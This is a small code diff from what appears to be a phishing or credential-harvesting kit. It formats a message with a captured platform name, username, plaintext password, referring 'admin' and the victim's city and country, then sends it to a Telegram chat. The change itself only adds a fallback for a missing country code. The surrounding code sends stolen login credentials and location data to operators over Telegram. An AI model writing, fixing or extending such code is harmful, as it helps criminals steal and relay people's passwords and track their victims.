@@ -656,7 +656,7 @@ Platform: ${escapeMarkdown(platformName)}
 Username: *${escapeMarkdown(username)}*
 \n Password: *${password}*
 Referrer: *${escapeMarkdown(admin.username)}*
-Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")}\n Country code: ${location.country_code}
+Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")}\n Country code: ${location.country_code || "Unknown country code"}
 `;
     sendTelegram(admin.chatId || ADMIN_CHAT_ID, adminMsg).catch(()=>null);
 
